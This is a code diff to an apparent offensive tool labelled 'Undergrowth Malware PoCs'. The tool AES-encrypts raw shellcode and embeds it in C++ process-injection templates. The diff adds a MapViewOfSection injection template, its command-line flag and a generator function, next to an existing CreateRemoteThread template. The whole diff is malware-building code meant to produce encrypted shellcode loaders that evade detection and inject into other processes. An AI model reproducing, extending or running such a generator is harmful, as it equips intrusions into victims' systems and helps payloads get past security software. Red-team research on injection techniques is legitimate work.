@@ -11,16 +11,15 @@ import os
 
 templates = {
 	'crt': './templates/createremotethreadRWX.cpp',
+	'mvs': './templates/mapviewofsectionRX.cpp',
 
 }
 
 resultFiles = {
 	'crt': './projects/createremotethreadRWX.cpp',
+	'mvs': './projects/mapviewofsectionRX.cpp',
 
 }
-
-
-
 #======================================================================================================
 # Randomized AES Encryption
 #======================================================================================================
@@ -47,6 +46,7 @@ if __name__ == '__main__':
 	parser = argparse.ArgumentParser(add_help=True, description="Undergrowth Malware PoCs")
 	parser.add_argument("shellcodeFile", help="File name containing the raw shellcode to be encoded/encrypted")
 	parser.add_argument("-crt", "--createremotethread", help="Generates C++ file code", action="store_true")
+	parser.add_argument("-mvs", "--mapviewofsection", help="Generates C++ file code", action="store_true")
 	args = parser.parse_args() 
 
 	if not os.path.isdir("./projects"):
@@ -81,6 +81,24 @@ def formatCRT(data, key):
 				print ("[+] C++ code file saved in [{}]".format(fileName))
 		except IOError:
 			print ("[!] Could not write C++ code  [{}]".format(fileName))
+			
+def formatMVS(data, key):
+	shellcode = "\\x"
+	shellcode += "\\x".join(format(ord(b),'02x') for b in data)
+	result = convertFromTemplate({'shellcode': shellcode, 'key': key}, templates['mvs'])
+
+	if result != None:
+		try:
+			fileName = os.path.splitext(resultFiles['mvs'])[0] +  os.path.splitext(resultFiles['mvs'])[1]
+			with open(fileName,"w+") as f:
+				f.write(result)
+				f.close()
+				print ("[+] C++ code file saved in [{}]".format(fileName))
+		except IOError:
+			print ("[!] Could not write C++ code  [{}]".format(fileName))
 if args.createremotethread:
 	print("Writing payload")
 	formatCRT(payload_s, aes_s)
+if args.mapviewofsection:
+	print("Writing payload")
+	formatMVS(payload_s, aes_s)
